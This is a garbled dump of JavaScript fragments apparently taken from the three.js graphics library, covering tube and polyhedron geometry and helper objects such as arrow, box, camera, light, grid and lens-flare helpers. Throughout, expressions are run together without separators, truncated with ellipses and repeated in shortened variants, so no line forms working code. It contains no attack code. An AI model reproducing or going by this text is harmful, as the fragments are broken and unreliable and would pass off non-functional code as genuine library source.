)path.getPointAt( u )path.getPointAttangent ... s[ i ];tangent ... ts[ i ]tangents[ i ]normal  ... s[ i ];normal  ... ls[ i ]binorma ... s[ i ];binorma ... ls[ i ]binormals[ i ]j < radialSegmentsv = j / ... ath.PI;j / rad ... nts * 2cx = -r ... s( v );cx = -r ... os( v )-radius ... os( v )-radiuscy = ra ... n( v );cy = ra ... in( v )radius  ... in( v )pos2.copy( pos );pos2.copy( pos )pos2.copypos2.x  ... rmal.x;pos2.x  ... ormal.xpos2.xcx * no ... ormal.xcx * normal.xcy * binormal.xbinormal.xpos2.y  ... rmal.y;pos2.y  ... ormal.ypos2.ycx * no ... ormal.ycx * normal.ycy * binormal.ybinormal.ypos2.z  ... rmal.z;pos2.z  ... ormal.zpos2.zcx * no ... ormal.zcx * normal.znormal.zcy * binormal.zbinormal.zgrid[ i ... s2.z );grid[ i ... os2.z )vert( p ... os2.z )i < segmentsip = (  ...  i + 1;ip = (  ... : i + 1( close ... : i + 1( closed )(i + 1) % segments(i + 1)jp = (j ... gments;jp = (j ... egments(j + 1) ... egments(j + 1)a = grid[ i ][ j ];b = grid[ ip ][ j ];c = gri ... [ jp ];d = grid[ i ][ jp ];uva = n ... ents );uvb = n ... ents );( i + 1 ) / segmentsuvc = n ... ents );uvd = n ... ents );THREE.T ... \n\t}\r\n};THREE.T ... \r\n\t}\r\n}{\r\n\r\n\tv ... \r\n\t}\r\n}var\ttan ... , u, v;tangent ... ctor3()tangents = []binormals = []vec = n ... ctor3()mat = n ... trix4()epsilon = 0.0001tangent ... t( u );tangent ... At( u )path.ge ... At( u )path.getTangentAttangent ... lize();tangent ... alize()tangent ... rmalizeinitialNormal3();initialNormal3()functio ... ();\r\n\t}{\r\n\t\t// ... ();\r\n\t}normals ... tor3();normals ... ctor3()normals[ 0 ]binormals[ 0 ]if (las ... 0, 1 );lastBin ... definedlastBin ... 0, 1 );lastBin ...  0, 1 )normals ... lize();normals ... alize()normals ... rmalizenormals ... [ 0 ] )normals ... Vectorstangents[ 0 ]binorma ... lize();binorma ... alize()binorma ... rmalizebinorma ... [ 0 ] )binorma ... Vectorsvar t2  ... ilon );t2 = pa ... silon )path.ge ... silon )new THR ... alize()new THR ... rmalizenew THR ... [ 0 ] )new THR ... Vectorsbinorma ...  0 ] );{\r\n\t\t// ...  );\r\n\t}smalles ... _VALUE;smalles ... X_VALUEtx = Ma ...  ].x );tx = Ma ... 0 ].x )Math.ab ... 0 ].x )tangents[ 0 ].xty = Ma ...  ].y );ty = Ma ... 0 ].y )Math.ab ... 0 ].y )tangents[ 0 ].ytz = Ma ...  ].z );tz = Ma ... 0 ].z )Math.ab ... 0 ].z )tangents[ 0 ].zif ( tx ... );\r\n\t\t}tx <= smallest{\r\n\t\t\ts ... );\r\n\t\t}smallest = tx;smallest = txnormal. ... 0, 0 );normal. ...  0, 0 )if ( ty ... );\r\n\t\t}ty <= smallestsmallest = ty;smallest = tynormal. ... 1, 0 );normal. ...  1, 0 )if ( tz ... );\r\n\t\t}tz <= smallest{\r\n\t\t\tn ... );\r\n\t\t}normal. ... 0, 1 );normal. ...  0, 1 )vec.cro ... lize();vec.cro ... alize()vec.cro ... rmalizevec.cro ... ormal )vec.crossVectorsnormals ...  vec );normals ... , vec )normals ... lone();normals ... clone()normals[ i-1 ].clonenormals[ i-1 ]i-1binorma ... lone();binorma ... clone()binorma ... ].clonebinormals[ i-1 ]vec.cro ...  i ] );vec.cro ... [ i ] )tangents[ i-1 ]vec.len ... epsilonvec.length()vec.lengthvec.normalize();theta = ...  1 ) );theta = ... , 1 ) )tangent ... [ i ] )tangents[ i-1 ].dotnormals ... ta ) );normals ... eta ) )normals ... Matrix4mat.mak ... theta )mat.makeRotationAxisbinorma ...  i ] );binorma ... [ i ] )if ( cl ... }\r\n\r\n\t}normals ... s-1 ] )normals[ 0 ].dotnormals ... nts-1 ]numpoints-1theta / ...  - 1 );theta / ... s - 1 )if ( ta ... \r\n\r\n\t\t}tangent ... ) ) > 0tangent ... 1 ] ) )tangents[ 0 ].dotvec.cro ... s-1 ] )theta = -theta;theta = -theta-thetanormals ...  i ) );normals ... * i ) )mat.mak ... a * i )theta * iTHREE.P ... \n\r\n\r\n};THREE.P ... \r\n\r\n\r\n}THREE.P ... eometryfunctio ... \r\n\r\n\r\n}{\r\n\r\n\tT ... \r\n\r\n\r\n}detail  ... l || 0;detail = detail || 0detail || 0var that = this;that = thisl = vertices.lengthprepare ...  ] ) );prepare ... 2 ] ) )new THR ... + 2 ] )vertices[ i + 2 ]var mid ... rtices;midpoints = []p = this.verticesvar faces = [];faces = []i += 3, j ++var v1  ...    ] ];v1 = p[ ...     ] ]p[ indi ...     ] ]indices[ i     ]var v2  ...  1 ] ];v2 = p[ ... + 1 ] ]p[ indi ... + 1 ] ]var v3  ...  2 ] ];v3 = p[ ... + 2 ] ]p[ indi ... + 2 ] ]faces[  ... () ] );faces[  ... e() ] )faces[ j ]v1.indexv2.indexv3.index[ v1.cl ... one() ]v2.clone()v2.clonev3.clone()v3.clonevar cen ... tor3();centroi ... ctor3()l = faces.lengthsubdivi ... tail );subdivi ... etail )var uvs ... ][ i ];uvs = t ...  ][ i ]this.fa ...  ][ i ]var x0 = uvs[ 0 ].x;x0 = uvs[ 0 ].xuvs[ 0 ].xvar x1 = uvs[ 1 ].x;x1 = uvs[ 1 ].xuvs[ 1 ].xvar x2 = uvs[ 2 ].x;x2 = uvs[ 2 ].xuvs[ 2 ].xvar max ... x2 ) );max = M ...  x2 ) )Math.ma ...  x2 ) )Math.max( x1, x2 )var min ... x2 ) );min = M ...  x2 ) )Math.mi ...  x2 ) )Math.min( x1, x2 )max > 0 ... n < 0.1max > 0.9min < 0.1{ // 0. ... \r\n\r\n\t\t}if ( x0 ... x += 1;x0 < 0.2uvs[ 0 ].x += 1;uvs[ 0 ].x += 1if ( x1 ... x += 1;x1 < 0.2uvs[ 1 ].x += 1;uvs[ 1 ].x += 1if ( x2 ... x += 1;x2 < 0.2uvs[ 2 ].x += 1;uvs[ 2 ].x += 1this.ve ... dius );this.ve ... adius )this.ve ... yScalarvertex  ... clone()vector. ... clone()vector. ... ).clonevector.normalize()vector.normalizevertex. ...  ) - 1;vertex. ... x ) - 1vertex.indexthat.ve ... x ) - 1that.ve ... ertex )that.vertices.pushthat.verticesvar u = ...  + 0.5;u = azi ... I + 0.5azimuth ... I + 0.5azimuth ... Math.PIazimuth ... r ) / 2azimuth( vector )var v = ...  + 0.5;v = inc ... I + 0.5inclina ... I + 0.5inclina ... Math.PIinclina ... ector )vertex. ...  - v );vertex. ... 1 - v )vertex.uvthat.fa ... face );that.fa ...  face )that.faces.pushthat.facescentroi ... r( 3 );centroi ... ar( 3 )centroi ... eScalarcentroi ... d( v3 )centroi ... 2 ).addcentroi ... d( v2 )centroi ... 1 ).addcentroid.copy( v1 )centroid.copyvar azi ... roid );azi = a ... troid )azimuth( centroid )that.fa ... \n\t\t] );that.fa ... \r\n\t\t] )that.fa ...  ].pushthat.fa ... vs[ 0 ]that.faceVertexUvs[\r\n\t\t\tc ...  )\r\n\t\t]correct ... , azi )v1.uvv2.uvv3.uvvar col ... etail);cols =  ... detail)Math.pow(2, detail)var cel ... etail);cells = ... detail)Math.pow(4, detail)var a = ... .a ] );a = pre ... e.a ] )prepare ... e.a ] )that.ve ... ace.a ]var b = ... .b ] );b = pre ... e.b ] )prepare ... e.b ] )that.ve ... ace.b ]var c = ... .c ] );c = pre ... e.c ] )prepare ... e.c ] )that.ve ... ace.c ]var v = [];v = []i <= colsv[ i ] = [];v[ i ] = []v[ i ]var aj  ... ls ) );aj = pr ... ols ) )prepare ... ols ) )a.clone ...  cols )a.clone().lerpa.clone()a.clonei / colsvar bj  ... ls ) );bj = pr ... ols ) )b.clone ...  cols )b.clone().lerpb.clone()b.clonevar rows = cols - i;rows = cols - icols - ij <= rowsif ( j  ... \r\n\t\t\t\t}j == 0 && i == colsj == 0i == colsv[ i ][ j ] = aj;v[ i ][ j ] = ajv[ i ][ j ]v[ i ][ ... ws ) );v[ i ][ ... ows ) )prepare ... ows ) )aj.clon ...  rows )aj.clone().lerpaj.clone()aj.clonej / rowsi < colsj < 2 * ...  i) - 12 * (cols - i) - 12 * (cols - i)(cols - i)var k = ...  / 2 );k = Mat ... j / 2 )Math.floor( j / 2 )j / 2j % 2 == 0j % 2make(\r\n ... \t\t\t\t\t);make(\r\n ... \n\t\t\t\t\t)v[ i ][ k + 1]k + 1v[ i + 1 ][ k ]v[ i + 1 ]v[ i ][ k ]v[ i ][ k + 1 ]v[ i + 1][ k + 1]v[ i + 1]return  ... or.x );Math.at ... tor.x )-vector.xMath.at ... z ) ) )-vector.yMath.sq ... r.z ) )( vecto ... tor.z )( vecto ... tor.x )vector.x * vector.xvector.z * vector.zif ( (  ... uv.y );( azimu ... === 1 )( azimuth < 0 )azimuth < 0( uv.x === 1 )uv.x === 1uv.xuv = ne ... uv.y );uv = ne ...  uv.y )new THR ...  uv.y )uv.x - 1uv.y( vecto ... === 0 )( vector.x === 0 )vector.x === 0( vector.z === 0 )vector.z === 0azimuth / 2return uv.clone();uv.clone()uv.cloneTHREE.I ... );\r\n\r\n}this.pa ... il\r\n\t};this.pa ... ail\r\n\t}{\r\n\t\tra ... ail\r\n\t}detail: detailvar t = ...  ) / 2;t = ( 1 ... ) ) / 2( 1 + M ... ) ) / 2( 1 + M ... ( 5 ) )1 + Math.sqrt( 5 )Math.sqrt( 5 )var ver ...  1\r\n\t];vertice ...   1\r\n\t][\r\n\t\t-1 ...   1\r\n\t]-tvar ind ...  1\r\n\t];indices ...   1\r\n\t][\r\n\t\t 0 ...   1\r\n\t]THREE.P ... tail );THREE.P ... etail )THREE.P ... ry.callTHREE.O ...  );\r\n};THREE.O ... l );\r\n}THREE.O ... eometryfunctio ... l );\r\n}{\r\n\r\n\tt ... l );\r\n}var ver ... -1\r\n\t];vertice ... ,-1\r\n\t][\r\n\t\t1, ... ,-1\r\n\t]var ind ...  2\r\n\t];indices ... , 2\r\n\t][\r\n\t\t0, ... , 2\r\n\t]vertice ...  -1\r\n\t][\r\n\t\t 1 ...  -1\r\n\t][\r\n\t\t 2 ...   1\r\n\t]verts = ... erticesvar i, il, j, p;var u, v;var sta ... ks + 1;stackCo ... cks + 1stacks + 1var sli ... es + 1;sliceCo ... ces + 1slices + 1i <= stacksv = i / stacks;v = i / stacksi / stacksj <= slicesu = j / slices;u = j / slicesj / slicesp = func( u, v );p = func( u, v )func( u, v )verts.push( p );verts.push( p )verts.pushvar uva ... c, uvd;i < stacksj < slicesa = i * ... nt + j;a = i * ... unt + ji * sliceCount + ji * sliceCountb = i * ...  j + 1;b = i * ... + j + 1i * sli ... + j + 1c = (i  ...  j + 1;c = (i  ... + j + 1(i + 1) ... + j + 1(i + 1) ... unt + j(i + 1) * sliceCountd = (i  ... nt + j;d = (i  ... unt + juva = n ... acks );uva = n ... tacks )new THR ... tacks )uvb = n ... acks );uvb = n ... tacks )( j + 1 ) / slicesuvc = n ... acks );uvc = n ... tacks )( i + 1 ) / stacksuvd = n ... acks );uvd = n ... tacks )faces.p ...  d ) );faces.p ... , d ) )faces.pushuvs.pus ... vd ] );uvs.pus ... uvd ] )uvs.pus ... () ] );uvs.pus ... e() ] )THREE.AxisHelper{\r\n\r\n\ts ... );\r\n\r\n}size = size || 1;size = size || 1size || 1geometr ...  )\r\n\t);geometr ... e )\r\n\t)new THR ... ze, 0 )new THR ...  size )geometr ... f )\r\n\t)geometry.colors.pushnew THR ... f0000 )new THR ... 0ff00 )new THR ... aff00 )11206400new THR ... 000ff )new THR ... 0aaff )43775var mat ... rs } );materia ... ors } )new THR ... ors } ){ verte ... olors }THREE.L ... eces );THREE.L ... ieces )THREE.Line.callTHREE.ArrowHelper{\r\n\r\n\t/ ... );\r\n\r\n}if ( co ... ffff00;color = 0xffff00;color = 0xffff00if ( le ... th = 1;length = 1;length = 1if ( he ... length;headLen ... definedheadLen ... length;headLen ...  length0.2 * lengthif ( he ... Length;headWid ... definedheadWid ... Length;headWid ... dLength0.2 * headLengththis.po ... origin;this.po ...  originvar lin ... etry();lineGeo ... metry()lineGeo ...  0 ) );lineGeo ... , 0 ) )lineGeo ... es.pushlineGeo ... erticesthis.li ...  } ) );this.li ... r } ) )this.linenew THR ... r } ) )new THR ... lor } ){ color: color }color: colorthis.li ... oUpdatethis.ad ... line );this.ad ... .line )var con ... 5, 1 );coneGeo ...  5, 1 )new THR ...  5, 1 )coneGeo ...  0 ) );coneGeo ... , 0 ) )coneGeo ... yMatrixnew THR ... .5, 0 )this.co ...  } ) );this.co ... r } ) )this.conethis.co ... oUpdatethis.ad ... cone );this.ad ... .cone )this.se ...  dir );this.se ... ( dir )this.setDirectionthis.se ... idth );this.se ... Width )this.setLengthTHREE.A ... \n\r\n}();THREE.A ... \r\n\r\n}()THREE.A ... rectionvar axi ... tor3();axis =  ... ctor3()var radians;dir.y > 0.99999dir.ythis.qu ... 0, 1 );this.qu ...  0, 1 )this.quaternion.setdir.y < - 0.99999- 0.99999this.qu ... 0, 0 );this.qu ...  0, 0 )axis.se ... lize();axis.se ... alize()axis.se ... rmalizeaxis.se ... dir.x )axis.setdir.z- dir.xdir.xradians ... ir.y );radians ... dir.y )Math.acos( dir.y )this.qu ... ians );this.qu ... dians )THREE.A ... tLengththis.li ... h, 1 );this.li ... th, 1 )this.line.scale.setthis.line.scalethis.li ... trix();this.li ... atrix()this.li ... eMatrixthis.co ... idth );this.co ... Width )this.cone.scale.setthis.cone.scalethis.co ... length;this.co ...  lengththis.cone.position.ythis.cone.positionthis.co ... trix();this.co ... atrix()this.co ... eMatrixTHREE.A ... etColorthis.li ... olor );this.li ... color )this.li ... lor.setthis.li ... l.colorthis.line.materialthis.co ... lor.setthis.co ... l.colorthis.cone.materialTHREE.BoxHelpervar ver ...  )\r\n\t];vertice ... 1 )\r\n\t][\r\n\t\tne ... 1 )\r\n\t]new THR ... ,   1 )new THR ... , - 1 )this.ve ... rtices;this.ve ... erticesgeometr ...  ]\r\n\t);geometr ... 7 ]\r\n\t)vertices[ 2 ]vertices[ 3 ]vertices[ 4 ]vertices[ 5 ]vertices[ 6 ]vertices[ 7 ]new THR ... f00 } ){ color: 0xffff00 }color: 0xffff00this.up ... ject );this.up ... bject )THREE.B ... d;\r\n\r\n}if ( ge ... ;\r\n\r\n\t}var min ... ox.min;min = g ... Box.mingeometr ... Box.minvar max ... ox.max;max = g ... Box.maxgeometr ... Box.maxvertice ... ax.z );vertice ... max.z )vertices[ 0 ].setvertices[ 1 ].setvertices[ 2 ].setvertices[ 3 ].setvertice ... in.z );vertice ... min.z )vertices[ 4 ].setvertices[ 5 ].setvertices[ 6 ].setvertices[ 7 ].setthis.ge ... here();this.ge ... phere()this.ge ... gSpherethis.ge ... dUpdatethis.ma ... xWorld;this.ma ... ixWorldTHREE.B ... xHelpervar col ... 888888;color = ... x888888( hex ! ... x888888( hex ! ... fined )hex !== undefined8947848this.boxTHREE.M ...  } ) );THREE.M ... e } ) )new THR ... rue } ){ color ...  true }wireframe: truethis.bo ... ject );this.bo ... bject )this.bo ... mObjectthis.bo ... cale );this.bo ... scale )this.box.sizethis.bo ... tion );this.bo ... ition )this.box.centerTHREE.CameraHelper{ color ... olors }color: 0xffffffvertexC ... eColorsvar pointMap = {};pointMap = {}var hex ... ffaa00;hexFrus ... xffaa00var hex ... ff0000;hexCone = 0xff0000var hex ... 00aaff;hexUp = 0x00aaffvar hex ... ffffff;hexTarget = 0xffffffvar hex ... 333333;hexCross = 0x3333333355443addLine ... stum );addLine ... ustum )f1f2addLine ... Cone );addLine ... xCone )addLine ... exUp );addLine ... hexUp )u3addLine ... rget );addLine ... arget )addLine ... ross );addLine ... Cross )cn1cn2cn3cn4cf1cf2cf3cf4addPoint( a, hex );addPoint( a, hex )addPoint( b, hex );addPoint( b, hex )geometr ... r3() );geometr ... or3() )geometr ... ex ) );geometr ... hex ) )pointMa ... definedpointMap[ id ]pointMap[ id ] = [];pointMap[ id ] = []pointMa ...  - 1 );pointMa ... h - 1 )pointMap[ id ].pushgeometr ... gth - 1this.po ... intMap;this.po ... ointMapthis.pointMapTHREE.C ... .updatevar pro ... ctor();project ... ector()var w = 1, h = 1;w = 1h = 1setPoin ... , -1 );setPoin ... 0, -1 )setPoin ... ,  1 );setPoin ... 0,  1 )setPoin ... h, -1 )-w-hsetPoin ... h, 1 );setPoin ... -h, 1 )setPoin ...  h, 1 )setPoin ... 1, -1 )w * 0.7h * 1.1-w * 0.7setPoin ...   -1 );setPoin ...    -1 )h * 2setPoin ... 0, 1 );setPoin ...  0, 1 )vector. ... y, z );vector. ...  y, z )project ... mera );project ... amera )project ... tVectorvar poi ... oint ];points  ... point ]scope.p ... point ]scope.pointMappoints !== undefinedscope.g ... ctor );scope.g ... ector )scope.g ...  ].copyscope.g ... [ i ] ]scope.g ... erticesscope.geometryTHREE.D ... );\r\n\r\n}THREE.D ... tHelperDirecti ... tHelperthis.light = light;this.light = lightthis.lightthis.li ... orld();this.li ... World()this.li ... ixWorldgeometr ... 0 )\r\n\t)- sizevar mat ... se } );materia ... lse } )new THR ... lse } ){ fog: false }fog: falsemateria ... sity );materia ... nsity )materia ... yScalarthis.light.colorthis.light.intensitythis.li ... rial );this.li ... erial )this.lightPlanethis.ad ... lane );this.ad ... Plane )geometr ... etry();geometr ... ()\r\n\t);geometr ... 3()\r\n\t)materia ... se } );this.ta ... rial );this.ta ... erial )this.targetLinethis.ad ... Line );this.ad ... tLine )THREE.D ... ();\r\n};THREE.D ... e();\r\n}THREE.D ... disposefunctio ... e();\r\n}{\r\n\t\r\n\t ... e();\r\n}this.li ... pose();this.li ... spose()this.li ... disposethis.li ... eometrythis.li ... aterialthis.ta ... pose();this.ta ... spose()this.ta ... disposethis.ta ... eometrythis.ta ... aterialTHREE.D ... \n\r\n}();THREE.D ... \r\n\r\n}()THREE.D ... .updatevar v3  ... tor3();v3 = ne ... ctor3()return  ... ;\r\n\r\n\t}this.light.targetv3.subV ... , v1 );v3.subV ... 2, v1 )v3.subVectorsthis.li ... ( v3 );this.li ... t( v3 )this.li ... .lookAtthis.li ... sity );this.li ... nsity )this.li ... yScalarthis.li ... or.copythis.ta ... ( v3 );this.ta ... y( v3 )this.ta ...  ].copythis.ta ... es[ 1 ]this.ta ... erticesthis.ta ... = true;this.ta ...  = truethis.ta ... olor );this.ta ... color )this.ta ... or.copythis.ta ... l.colorTHREE.E ... d;\r\n\r\n}THREE.EdgesHelpervar col ... ffffff;color = ... xffffff( hex ! ... xffffffvar edg ... h = {};edge = [ 0, 0 ]hash = {}var sor ...  - b };sortFun ... a - b }functio ... a - b }{ return a - b }return a - ba - bvar key ...  'c' ];keys =  ... , 'c' ][ 'a', 'b', 'c' ]var geo ... lone();geometr ... clone()object. ... y.clonegeometr ... ices();geometr ... tices()geometry2.verticesfaces = ... 2.facesgeometry2.facesvar numEdges = 0;numEdges = 0edge[ 0 ...  j ] ];edge[ 0 ... [ j ] ]edge[ 0 ]face[ keys[ j ] ]keys[ j ]edge[ 1 ...  3 ] ];edge[ 1 ... % 3 ] ]edge[ 1 ]face[ k ... % 3 ] ]keys[ ( ... ) % 3 ]( j + 1 ) % 3edge.so ... tion );edge.so ... ction )edge.sortvar key ... ring();key = e ... tring()edge.toString()edge.toStringif ( ha ... \n\r\n\t\t\t}hash[ k ... definedhash[ key ]hash[ k ... ined };hash[ k ... fined }{ vert1 ... fined }vert1: edge[ 0 ]vert2: edge[ 1 ]face1: iface2: undefinednumEdges ++;numEdges ++hash[ k ... e2 = i;hash[ k ... ce2 = ihash[ key ].face2geometr ... , 3 ) )new THR ...  2, 3 )numEdges * 2var coo ... .array;coords  ... n.arraygeometr ... n.arraygeometr ... ositionvar index = 0;index = 0var h = hash[ key ];h = hash[ key ]if ( h. ... \r\n\r\n\t\t}h.face2 ...  0.9999h.face2 ... definedh.face2faces[  ...  0.9999faces[  ... ormal )faces[  ... mal.dotfaces[  ... .normalfaces[ h.face1 ]h.face1faces[ h.face2 ]{ // ha ... \r\n\r\n\t\t}var ver ... ert1 ];vertex  ... vert1 ]vertices[ h.vert1 ]h.vert1coords[ ... rtex.x;coords[ ... ertex.xcoords[ index ++ ]index ++coords[ ... rtex.y;coords[ ... ertex.ycoords[ ... rtex.z;coords[ ... ertex.zvertex  ... ert2 ];vertex  ... vert2 ]vertices[ h.vert2 ]h.vert2THREE.F ... sHelperthis.si ... ze : 1;this.si ... ize : 1( size  ... ize : 1( size  ... fined )size !== undefinedvar col ... ffff00;color = ... xffff00( hex ! ... xffff00var wid ... th : 1;width = ... dth : 1( linew ... dth : 1( linew ... fined )linewid ... definedthis.ob ... y.facesthis.object.geometrynew THR ... dth } ){ color ... width }linewidth: widththis.no ... rix3();this.no ... trix3()this.normalMatrixTHREE.F ... .updateobject = this.objectvar obj ... rtices;objectV ... erticesvar obj ... .faces;objectF ... y.facesvar obj ... xWorld;objectW ... ixWorldthis.no ... trix );this.no ... atrix )this.no ... lMatrixi ++, i2 += 2i2 += 2i2 = 0objectFaces.lengthobjectFaces[ i ]vertice ... trix );vertice ... atrix )vertice ... Matrix4vertice ... ar( 3 )vertice ... eScalarvertice ... e.c ] )vertice ... \t\t\t.addvertice ... e.b ] )vertice ... e.a ] )vertices[ i2 ].copyvertices[ i2 ]objectV ... ace.a ]objectV ... ace.b ]objectV ... ace.c ]vertice ... i2 ] );vertice ...  i2 ] )vertice ... .size )vertice ... yScalarvertice ... Matrix3vertice ...  ].copyvertices[ i2 + 1 ]i2 + 1THREE.GridHelperthis.co ... 4444 );this.co ... 44444 )this.color1new THR ... 44444 )4473924this.co ... 8888 );this.co ... 88888 )this.color2new THR ... 88888 )i <= sizei += stepvar i = - sizei = - sizegeometr ... )\r\n\t\t);geometr ...  )\r\n\t\t)new THR ...  0, i )var col ... color2;color = ... .color2i === 0 ... .color2geometr ... olor );geometr ... color )THREE.G ... tColorsthis.co ... Line );this.co ... rLine )this.color1.setthis.co ... Grid );this.co ... rGrid )this.color2.setTHREE.H ... );\r\n\r\n}THREE.H ... tHelperHemisph ... tHelperthis.co ... or() ];this.co ... lor() ]var geo ... 4, 2 );geometr ...  4, 2 )new THR ...  4, 2 )geometr ...  2 ) );geometr ... / 2 ) )new THR ... I / 2 )new THR ... tationXvar i = 0, il = 8il = 8geometr ...  : 1 ];geometr ... 0 : 1 ]geometr ... ].colorgeometry.faces[ i ]this.co ... 0 : 1 ]i < 4 ? 0 : 1var mat ... ue } );materia ... rue } ){ verte ...  true }this.lightSpherethis.ad ... here );this.ad ... phere )THREE.H ... ();\r\n};THREE.H ... e();\r\n}THREE.H ... dispose{\r\n\tthi ... e();\r\n}THREE.H ... \n\r\n}();THREE.H ... \r\n\r\n}()THREE.H ... .updatethis.co ... sity );this.co ... nsity )this.co ...  ].copythis.colors[ 0 ]this.co ... Color )this.colors[ 1 ]this.li ... ndColorthis.li ... te() );this.li ... ate() )vector. ... egate()vector. ... .negatevector. ... ositionthis.li ... = true;this.li ...  = trueTHREE.P ... /\r\n\r\n};THREE.P ... */\r\n\r\n}THREE.P ... tHelperfunctio ... */\r\n\r\n}{\r\n\r\n\tt ... */\r\n\r\n}{ wiref ... false }THREE.P ... ();\r\n};THREE.P ... e();\r\n}THREE.P ... disposethis.ge ... disposethis.ma ... pose();this.ma ... spose()this.ma ... disposeTHREE.P ... .updatethis.ma ... sity );this.ma ... nsity )this.ma ... yScalarthis.ma ... color )this.ma ... or.copythis.material.colorTHREE.SkeletonHelpervar ske ... eleton;skeleto ... keletoni < ske ... .lengthskeleto ... .lengthskeleton.bonesvar bon ... s[ i ];bone =  ... es[ i ]skeleton.bones[ i ]bone.pa ... EE.Bonegeometr ...  1 ) );geometr ... , 1 ) )geometr ...  0 ) );geometr ... , 0 ) )vertexColors: truedepthTest: falsedepthWrite: falsetransparent: truethis.sk ... eleton;this.sk ... keletonTHREE.S ... .updatethis.sk ... es[ i ]geometr ... trix );geometr ... atrix )geometr ... es[ j ]bone.skinMatrixgeometr ... j + 1 ]bone.pa ... nMatrixj += 2;j += 2THREE.S ... tHelpervar geo ... true );geometr ...  true )new THR ...  true )this.co ... rial );this.co ... erial )THREE.S ... ();\r\n};THREE.S ... e();\r\n}THREE.S ... disposethis.co ... pose();this.co ... spose()this.co ... disposethis.cone.geometryvar con ...  10000;coneLen ... : 10000this.li ... : 10000this.light.distancevar con ... ngle );coneWid ... angle )coneLen ... angle )Math.ta ... angle )this.light.anglethis.co ... ngth );this.co ... ength )vector. ... orld );vector2 ... orld );vector2 ... World )vector2 ... ositionthis.co ... or ) );this.co ... tor ) )this.cone.lookAtvector2 ... ector )vector2.subthis.co ... or.copyTHREE.V ... );\r\n\r\n}THREE.V ... sHelpervar col ... ff0000;color = ... xff0000( hex ! ... xff0000THREE.V ... type );THREE.V ... otype )THREE.V ... \r\n}());THREE.V ... \n\r\n}())THREE.V ... .update( funct ... \n\r\n}())var key ...  'd' ];keys =  ... , 'd' ]this.ob ... true );this.ob ...  true )this.ob ... ixWorldthis.no ... orld );this.no ... World )this.ob ... erticesvar wor ... xWorld;worldMa ... ixWorldvar idx = 0;idx = 0var ver ...  j ] ];vertexI ... [ j ] ]var ver ... exId ];vertex  ... texId ]verts[ vertexId ]var nor ... s[ j ];normal  ... ls[ j ]vertice ... ertex )vertices[ idx ].copyvertices[ idx ]v1.copy ... size );v1.copy ... .size )v1.add( ... dx ] );v1.add( ... idx ] )v1.addidx = idx + 1;idx = idx + 1vertice ... ( v1 );vertice ... y( v1 )var col ... 0000ff;color = ... x0000ff( hex ! ... x0000ffvar tan ... s[ j ];tangent ... ts[ j ]face.ve ... ts[ j ]v1.copy ... rectionv1.copy( tangent )THREE.W ... d;\r\n\r\n}THREE.W ... eHelperobject. ... eometryvar edg ... ngth );edges = ... ength )6 * faces.lengthedges[  ... e[ 0 ];edges[  ... ge[ 0 ]edges[  ... Edges ]2 * numEdgesedges[  ... e[ 1 ];edges[  ... ge[ 1 ]edges[  ... s + 1 ]2 * numEdges + 1hash[ key ] = true;hash[ key ] = truevar i = ... umEdgesl = numEdgesj < 2var ver ... + j] ];vertex  ...  + j] ]vertice ...  + j] ]edges [ 2 * i + j]2 * i + j2 * ivar ind ...  3 * j;index = ... + 3 * j6 * i + 3 * j6 * i3 * jcoords[ index + 0 ]index + 0coords[ index + 1 ]coords[ index + 2 ]object. ... s.indexobject. ... ributes{ // in ... }\r\n\r\n\t}vertice ... n.arrayobject. ... n.arrayobject. ... ositionobject. ... x.arrayobject. ... offsets2 * indices.length++ ooffsets[ o ].startoffsets[ o ].countoffsets[ o ].indexedge[ 0 ...  + j ];edge[ 0 ... i + j ]index + ... i + j ]indices[ i + j ]i + jedge[ 1 ...  % 3 ];edge[ 1 ... ) % 3 ]index + ... ) % 3 ]i + ( j + 1 ) % 3if ( ha ... \n\t\t\t\t\t}var ind ... i + j];index2  ...  i + j]3 * edg ...  i + j]edges[ 2 * i + j]coords[ ... dex2 ];coords[ ... ndex2 ]vertices[ index2 ]coords[ ...  + 1 ];coords[ ... 2 + 1 ]vertice ... 2 + 1 ]index2 + 1coords[ ...  + 2 ];coords[ ... 2 + 2 ]vertice ... 2 + 2 ]index2 + 2{ // no ... }\r\n\r\n\t}var num ... th / 3;numEdge ... gth / 3vertices.length / 3var num ... es / 3;numTris ... ges / 3numEdges / 3var i = ... numTrisl = numTrisvar ind ...  6 * j;index = ... + 6 * j18 * i + 6 * j18 * i6 * jindex1  ... + 3 * j9 * i + 3 * j9 * icoords[ ... dex1 ];coords[ ... ndex1 ]vertices[ index1 ]coords[ ... 1 + 1 ]vertice ... 1 + 1 ]index1 + 1coords[ ... 1 + 2 ]vertice ... 1 + 2 ]index1 + 2var ind ...  % 3 );index2  ... ) % 3 )9 * i + ... ) % 3 )3 * ( ( ... ) % 3 )( ( j + 1 ) % 3 )coords[ index + 3 ]coords[ index + 4 ]index + 4coords[ index + 5 ]index + 5THREE.I ... };\r\n\r\n}this.re ...  ) { };this.re ... k ) { }functio ... k ) { }this.le ... s = [];this.lensFlares = []this.lensFlaresthis.cu ... efined;this.cu ... definedthis.cu ... allbackif( tex ... ;\r\n\r\n\t}this.ad ... olor );this.ad ... color )THREE.L ... g\r\n\r\n};THREE.L ... ng\r\n\r\n}THREE.L ... ype.addfunctio ... ng\r\n\r\n}{\r\n\r\n\ti ... ng\r\n\r\n}if( siz ... e = -1;size === undefinedsize = -1;size = -1if( dis ... ce = 0;if( opa ... ty = 1;opacity ... definedopacity = 1;opacity = 1if( col ... ffff );color = ... ffff );color = ... fffff )if( ble ... ending;blendin ... definedblendin ... ending;distanc ... ce ) );distanc ... nce ) )Math.mi ... nce ) )Math.ma ... tance )this.le ... ng } );this.le ... ing } )this.lensFlares.push{ textu ... nding }texture: texturesize: sizescale: 1rotation: 1opacity: opacityblending: blendingTHREE.L ... sFlaresvar f,  ... length;this.le ... .lengthvar flare;var vec ... .x * 2;vecX =  ... n.x * 2-this.p ... n.x * 2-this.p ... creen.xthis.po ... creen.xvar vec ... .y * 2;vecY =  ... n.y * 2-this.p ... n.y * 2-this.p ... creen.ythis.po ... creen.yfor( f  ... ;\r\n\r\n\t}flare = ... s[ f ];flare = ... es[ f ]this.lensFlares[ f ]flare.x ... stance;flare.x ... istanceflare.xthis.po ... istancevecX *  ... istanceflare.distanceflare.y ... stance;flare.y ... istanceflare.yvecY *  ... istanceflare.w ... * 0.25;flare.w ...  * 0.25flare.wantedRotationflare.x ...  * 0.25flare.x * Math.PIflare.r ... * 0.25;flare.r ...  * 0.25flare.rotation( flare ...  * 0.25( flare ... ation )flare.w ... otationTHREE.MorphBlendMeshthis.an ... p = {};this.an ... ap = 